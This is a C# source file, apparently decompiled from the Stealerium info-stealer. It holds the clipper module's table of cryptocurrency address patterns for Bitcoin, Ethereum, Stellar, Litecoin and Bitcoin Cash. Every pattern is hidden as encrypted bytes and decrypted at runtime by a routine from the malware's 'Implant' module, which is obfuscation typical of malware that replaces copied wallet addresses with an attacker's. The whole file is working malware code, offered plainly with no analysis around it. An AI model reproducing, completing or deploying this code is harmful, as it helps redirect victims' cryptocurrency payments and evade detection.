using System.Collections.Generic;
using System.Text.RegularExpressions;
using Stealerium.Modules.Implant;

namespace Stealerium.Clipper;

internal sealed class RegexPatterns
{
	public static Dictionary<string, Regex> PatternsList = new Dictionary<string, Regex>
	{
		{
			"btc",
			new Regex(StringsCrypt.Decrypt(new byte[48]
			{
				40, 125, 8, 210, 151, 244, 106, 89, 179, 50,
				166, 93, 117, 123, 232, 20, 172, 248, 145, 49,
				67, 253, 232, 173, 114, 127, 252, 161, 219, 104,
				168, 254, 58, 191, 98, 228, 161, 5, 159, 175,
				118, 74, 251, 10, 208, 170, 195, 1
			}))
		},
		{
			"eth",
			new Regex(StringsCrypt.Decrypt(new byte[32]
			{
				33, 40, 93, 173, 169, 91, 138, 48, 170, 13,
				227, 64, 83, 120, 66, 205, 80, 206, 220, 181,
				143, 18, 209, 77, 219, 160, 24, 109, 10, 208,
				47, 54
			}))
		},
		{
			"xlm",
			new Regex(StringsCrypt.Decrypt(new byte[32]
			{
				79, 62, 61, 187, 2, 16, 70, 125, 30, 238,
				128, 225, 213, 3, 28, 218, 118, 144, 191, 132,
				88, 58, 104, 162, 23, 41, 72, 164, 34, 207,
				181, 214
			}))
		},
		{
			"ltc",
			new Regex(StringsCrypt.Decrypt(new byte[48]
			{
				17, 119, 9, 237, 148, 94, 119, 16, 16, 181,
				187, 65, 189, 47, 92, 255, 156, 205, 202, 206,
				110, 131, 61, 217, 116, 224, 72, 180, 238, 66,
				142, 150, 159, 92, 82, 117, 222, 90, 240, 121,
				164, 149, 88, 167, 3, 100, 155, 42
			}))
		},
		{
			"bch",
			new Regex(StringsCrypt.Decrypt(new byte[48]
			{
				198, 65, 212, 209, 75, 30, 61, 115, 174, 245,
				173, 60, 184, 242, 67, 135, 177, 45, 102, 114,
				1, 116, 148, 111, 82, 137, 230, 121, 162, 94,
				196, 9, 156, 71, 84, 102, 212, 101, 242, 24,
				249, 21, 23, 163, 89, 26, 158, 81
			}))
		}
	};
}
